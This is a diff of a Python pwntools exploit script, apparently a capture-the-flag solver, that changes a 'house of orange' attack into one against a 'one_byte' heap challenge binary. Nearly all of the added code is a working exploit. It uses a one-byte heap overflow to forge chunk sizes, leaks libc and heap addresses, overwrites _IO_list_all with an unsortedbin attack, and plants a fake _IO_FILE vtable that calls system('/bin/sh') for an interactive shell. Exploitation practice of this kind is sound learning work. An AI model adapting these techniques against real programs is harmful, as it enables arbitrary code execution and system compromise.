@@ -3,158 +3,212 @@
 
 from pwn import *
 
-BINARY = './house_of_orange'
-LIBC = './libc.so.6'
-ADDR = 'localhost'
+BINARY = "./one_byte"
+LIBC = "./libc.so.6"
+ADDR = "localhost"
 PORT = 4444
 
 splash()
 elf = context.binary = ELF(BINARY)
 libc = ELF(LIBC, checksec=False)
 
+# Global index variable to keep track of allocated chunks.
+INDEX = 0
+
+
+class Constants:
+    CHUNK_SIZE = 0x58
+    UNSORTED_BIN_HEAD_OFFSET = 0x58
+    TIMEOUT = 0.1
+    VTABLE_OFFSET = 0x178
+
 
 def conn():
     if args.LOCAL:
         pty = process.PTY
         io = process(elf.path, stdin=pty, stdout=pty, stderr=pty)
-        io.timeout = 0.1
+        io.timeout = Constants.TIMEOUT
 
         return io
 
     if args.PWNDBG:
-        context.log_level = 'debug'
-        context.terminal = ['tmux', 'splitw', '-h']
-        return gdb.debug(elf.path, gdbscript='''init-pwndbg''')
+        context.log_level = "debug"
+        context.terminal = ["tmux", "splitw", "-h"]
+        return gdb.debug(elf.path, gdbscript="""init-pwndbg""")
 
     else:
         io = remote(ADDR, PORT)
-        io.timeout = 0.1
+        io.timeout = Constants.TIMEOUT
 
         return io
 
 
-def small_malloc(io):
+def malloc(io):
+    global INDEX
     io.send("1")
+    INDEX += 1
     io.recvuntil("> ")
+    return INDEX - 1
 
 
-def large_malloc(io):
+def free(io, index):
     io.send("2")
+    io.sendafter("index: ", f"{index}")
     io.recvuntil("> ")
 
 
-def edit(io, data):
+def edit(io, index, data):
     io.send("3")
+    io.sendafter("index: ", f"{index}")
     io.sendafter("data: ", data)
     io.recvuntil("> ")
 
 
+def read(io, index):
+    io.send("4")
+    io.sendafter("index: ", f"{index}")
+    data = io.recv(Constants.CHUNK_SIZE)
+    io.recvuntil("> ")
+    return data
+
+
 def solve():
     io = conn()
-
-    io.recvuntil("puts() @ ")
-    libc.address = int(io.recvline(), 16) - libc.sym.puts
-    io.recvuntil("heap @ ")
-    heap = int(io.recvline(), 16)
-
-    log.info("libc base found at: " + hex(libc.address))
-    log.info("heap base found at: " + hex(heap))
     io.recvuntil("> ")
 
     """
-    Request a small chunk of size 0x20. This chunk will be used to overflow
-    into the top chunk, overwriting the top chunk's size field.
+    We allocate 5 0x60 chunks on the heap. Because a heap overflow vulnerability
+    exists with the `edit()` function, we use this to conduct a one_byte
+    overflow to overwrite the size of the tamper_chunk, forging its size to
+    be the 0xc1. The tamper_chunk will be `free()`d, but it's too large for
+    the fastbin, so it's linked into the unsortedbin. When we `malloc()` again,
+    because no 0x60 candidates exist for allocation, `malloc()` remainders
+    the tamper_chunk and allocates a 0x60 size chunk to the tamper_chunk again.
+    `malloc()` writes the `fd` and `bk` pointers of the unsortedbin to the
+    leaker_chunk, which we can leverage to acquire a glibc leak.
     """
-    small_malloc(io)
+    overflow_chunk = malloc(io)
+    tamper_chunk = malloc(io)
+    leaker_chunk = malloc(io)
+    malloc(io)
+    fake_vtable_chunk = malloc(io)
+
+    payload = [
+        cyclic(Constants.CHUNK_SIZE, n=8),
+        0xC1,
+    ]
 
     """
-    The edit() function conducts no bounds checking. We will edit the first
-    small chunk on the heap, overflowing its contents until we overwrite the
-    size field of the top chunk. Because of glibc's top chunk checking /
-    overflow mitigations, we have to make sure the top chunk size is
-    page-aligned and that the prev_inuse bit is set. We are overwriting the
-    top chunk size to be smaller than our large_malloc() request, forcing
-    malloc() to request more memory from the kernel.
+    Conduct a one byte heap buffer overflow to overwrite the tamper_chunk's
+    size field, making the tamper_chunk too large for the fastbin.
+    """
+    edit(io, overflow_chunk, flat(payload))
+
+    # `free()` the tamper_chunk, linking it into the unsortedbin.
+    free(io, tamper_chunk)
+
+    """
+    Execute a `malloc()` for a 0x60 sized chunk. The tamper_chunk doesn't fit
+    the request, thus it is linked into the smallbin. `malloc()` then uses the
+    binmap to find a free chunk for this request. `malloc()` remainders the
+    tamper_chunk that's in the unsortedbin, satisfying the request, splitting
+    the tamper_chunk and writing the `fd` and `bk` pointers to the
+    leaker_chunk.
+    """
+    tamper_chunk = malloc(io)
+
+    """
+    `read()` the contents of the leaker_chunk which should now contain the
+    head of the unsortedbin, leaking the location of the main_arena.
+    """
+    libc.address = u64(read(io, leaker_chunk)[:8]) - (
+        libc.sym.main_arena + Constants.UNSORTED_BIN_HEAD_OFFSET
+    )
+    log.info(f"libc base found at: 0x{libc.address:02x}")
+
+    """
+    We conduct another `malloc()` for a 0x60 sized chunk, acquiring the
+    remainder that overlaps the leaker_chunk. We free the overflow_chunk in
+    order to link the chunk into the fastbin. Then we free our overlap/leak
+    chunk to link the chunk into the fastbin, creating a heap leak.
+    """
+    overlap_chunk = malloc(io)
+    free(io, overflow_chunk)
+    free(io, overlap_chunk)
+
+    # `read()` the heap address written into the leaker_chunk.
+    heap = u64(read(io, leaker_chunk)[:8])
+    log.info(f"heap base found at: 0x{heap:02x}")
+
+    # Empty the fastbin to acquire access to the overflow_chunk again
+    overlap_chunk = malloc(io)
+    overflow_chunk = malloc(io)
+
+    """
+    We conduct another one byte heap buffer overflow to overwrite the size of
+    the tamper_chunk back to 0xc1. We're going to use this to get the
+    leaker_chunk back into the unsortedbin.
     """
     payload = [
-        cyclic(0x18, n=8),
-        0x1000 - 0x20 + 0x1
+        cyclic(Constants.CHUNK_SIZE, n=8),
+        0xC1,
     ]
-    edit(io, flat(payload))
+
+    edit(io, overflow_chunk, flat(payload))
 
     """
-    Make a large request, forcing malloc() to request more memory from the
-    kernel. Because the top chunk size was corrupted to be smaller than its
-    actual size, we fool malloc() into thinking that the newly mmap()'d memory
-    segment is not contiguous with the old location of the top chunk. This
-    causes malloc() to call free() on the remaining space of
-    the top chunk. Because the newly free()'d chunk is too large to be linked
-    into the fastbin, it is linked into the unsortedbin.
+    We `free()` the tamper_chunk, leaking it back into the unsortedbin. We
+    follow this with a `malloc()` call, causing the tamper_chunk to be linked
+    into the smallbin. Finally, our `malloc()` request is serviced by
+    remaindering the tamper_chunk, writing `fd` and `bk` pointers into the
+    leaker_chunk.
     """
-    large_malloc(io)
+    free(io, tamper_chunk)
+    tamper_chunk = malloc(io)
 
     """
-    We overflow our small chunk again, overwriting the size field of the top
-    chunk to 0x61, and setting its bk to a fake chunk that overlaps the
-    location of libc.sym._IO_list_all. This symbol contains the head of the
-    _IO_list_all linked list, a list of all the file stream structures for
-    currently open files. When we conduct our unsortedbin attack, we will
-    overwrite this symbol, pointing the linked list to the main_arena.
-
-    This causes _IO_list_all to treat the main_arena as a file stream structure
-    . The main_arena will fail checks related to traversing the list, and the
-    chain member of the main_arena will be inspected next. Because our
-    overwritten free / top chunk was the size of a smallbin, the chunk was
-    linked into the smallbin when our unsortedbin attack was triggered.
-
-    The main_arena's chain member will point to this chunk on the heap where we
-    control the memory, and here is where we construct a fake _IO_FILE struct.
-    We construct our fake _IO_FILE struct in such a manner that, when the
-    vtable is used to search for the overflow member, overflow will be written
-    to be libc.sym.system. The top address to the top of the _IO_FILE struct is
-    passed as an argument to overflow, so we ensure the flags (usually NULL
-    bytes) of our overwritten chunk contain "/bin/sh\0".
+    We setup the leaker_chunk, which is currently in the unsortedbin, to setup
+    our unsortedbin attack. We overwrite the `fd` to NULL, the `bk` to a fake
+    chunk overlapping the `_IO_list_all` address, and we forge the `write_base`
+    and `write_ptr` attributes of our fake `_IO_FILE` struct.
     """
     fd = 0
-    bk = libc.sym._IO_list_all - 0x10
-    write_base = 1
-    write_ptr = 2
-    mode = 0
-    vtable_ptr = heap + 0xd8
-    overflow = libc.sym.system
-
+    write_base = 0
+    write_ptr = 1
     payload = [
-        b"\x00" * 0x10 + b"/bin/sh\0",
-        0x61,
         fd,
-        bk,
+        libc.sym._IO_list_all - 0x10,
         write_base,
         write_ptr,
-        p64(0) * 18,
-        p32(mode) + p32(0),
-        0,
-        overflow,
-        vtable_ptr
     ]
-    edit(io, flat(payload))
+
+    edit(io, leaker_chunk, flat(payload))
 
     """
-    We request another chunk of size 0x20. malloc() traverses our unsortedbin
-    to search for a free chunk matching this requirement, and encounters our
-    chunk containing the fake _IO_FILE struct. Because it is too large, the
-    _IO_FILE struct chunk is linked into the smallbin. malloc() follows the
-    bk of our _IO_FILE struct chunk to the main_arena, failing a chunk metadata
-    check and causing __malloc_printerr() to execute. This raises a SIGABRT,
-    and glibc begins flushing the buffer of every _IO_FILE in _IO_list_all
-    before exiting. This allows us to gain code execution - our vtable_ptr
-    is followed to our fake vtable on the heap. Here, our overflow function
-    is pointing to libc.sym.system. When the overflow function of our vtable is
-    called, we execute libc.sym.system() with the pointer to our _IO_FILE
-    struct. Because we placed "/bin/sh\0" at the very beginning of our _IO_FILE
-    struct, we instead execute libc.sym.system("/bin/sh\0").
+    Write the string "/bin/sh\0" into the last quadword of the tamper_chunk's
+    user data. We also use the one byte heap buffer overflow to modify the
+    leaker_chunk's size field, changing it to 0x69. This keeps the prev_inuse
+    bet set, however, when checks are conducted for our final 0x60 `malloc()`
+    call to trigger the unsortedbin attack, our unsortedbin attack candidate,
+    the leaker_chunk, will get linked into the unsortedbin rather than being
+    allocated because it's size field is corrupted.
     """
-    small_malloc(io)
+    payload = [cyclic(0x50, n=8), b"/bin/sh\0", 0x69]
 
+    edit(io, tamper_chunk, flat(payload))
+
+    """
+    Finally, we write the address of glibc.sym.system to the location of our
+    fake _overflow entry in our fake vtable. We overwrite the vtable_ptr
+    of our forged `_IO_FILE` struct to point back into the heap, overlapping
+    our fake _overflow entry that contains a pointer to libc.sym.system.
+    """
+    payload = [libc.sym.system, heap + Constants.VTABLE_OFFSET]
+
+    edit(io, fake_vtable_chunk, flat(payload))
+
+    # Trigger the unsortedbin attack.
+    malloc(io)
 
     io.interactive()
 
